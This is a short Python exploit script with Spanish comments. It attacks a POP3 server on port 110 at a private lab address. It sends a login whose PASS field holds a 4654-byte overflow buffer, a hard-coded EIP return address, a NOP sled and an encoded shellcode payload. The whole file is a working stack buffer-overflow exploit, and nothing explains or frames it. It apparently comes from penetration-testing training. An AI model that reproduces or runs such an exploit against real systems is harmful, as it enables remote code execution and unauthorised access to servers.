#!/usr/bin/python3 

from struct import pack
import socket
import sys

# Variables globales
ip_address = "192.168.57.117"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L", 0x5f4c4d13)

shellcode = (b"\xb8\xf4\xa0\xa4\xe1\xdb\xd0\xd9\x74\x24\xf4\x5b\x29\xc9"
b"\xb1\x44\x83\xc3\x04\x31\x43\x11\x03\x43\x11\xe2\x01\x5c"
b"\x4c\x63\xe9\x9d\x8d\x04\x60\x78\xbc\x04\x16\x08\xef\xb4"
b"\x5d\x5c\x1c\x3e\x33\x75\x97\x32\x9b\x7a\x10\xf8\xfd\xb5"
b"\xa1\x51\x3d\xd7\x21\xa8\x11\x37\x1b\x63\x64\x36\x5c\x9e"
b"\x84\x6a\x35\xd4\x3a\x9b\x32\xa0\x86\x10\x08\x24\x8e\xc5"
b"\xd9\x47\xbf\x5b\x51\x1e\x1f\x5d\xb6\x2a\x16\x45\xdb\x17"
b"\xe1\xfe\x2f\xe3\xf0\xd6\x61\x0c\x5e\x17\x4e\xff\x9f\x5f"
b"\x69\xe0\xea\xa9\x89\x9d\xec\x6d\xf3\x79\x79\x76\x53\x09"
b"\xd9\x52\x65\xde\xbf\x11\x69\xab\xb4\x7e\x6e\x2a\x19\xf5"
b"\x8a\xa7\x9c\xda\x1a\xf3\xba\xfe\x47\xa7\xa3\xa7\x2d\x06"
b"\xdc\xb8\x8d\xf7\x78\xb2\x20\xe3\xf1\x99\x2e\xf2\x84\xa7"
b"\x1d\xf4\x96\xa7\x31\x9d\xa7\x2c\xde\xda\x38\xe7\x9a\x15"
b"\x73\xaa\x8b\xbd\xdd\x3e\x8e\xa3\xde\x94\xcd\xdd\x5c\x1d"
b"\xae\x19\x7c\x54\xab\x66\x3b\x84\xc1\xf7\xa9\xaa\x76\xf7"
b"\xf8\xdb\x17\x70\x67\x6e\x9b\x16\x02\xe2\x37\xc7\x85\xbf"
b"\x9f\x2f\x5b\x05\x77\x1d\x2c\xe7\x1d\x38\xd1\x93\xc1\x8c"
b"\x70\x28\x2c\x46\x1f\xb2\x73\x04\xb6\x57\x1a\xa0\x61\xb6"
b"\x86\x27\x06\xa8\x2a\xd7\x89\x50\xe0\x53\x3b\xf0\x68\xfb"
b"\x93\x25\x1d\x77\x97\x59\xe7\x58\x78\xab\x2e\x95\xa8\xfa"
b"\x66\xe1\x9a\xc9\xb1\x3f\xd5\x03\x91\x6f\x4a\x4a\x9d\xfc"
b"\x5d\xb5\x74\x03")


payload = before_eip + eip + b"\x90"*16 + shellcode

def exploit():

    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connet to server
    s.connect((ip_address, port))

    # Recive the Banner
    banner = s.recv(1024)

    s.send(b"USER victor" + b'\r\n')
    response = s.recv(1024)
    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':

    exploit()
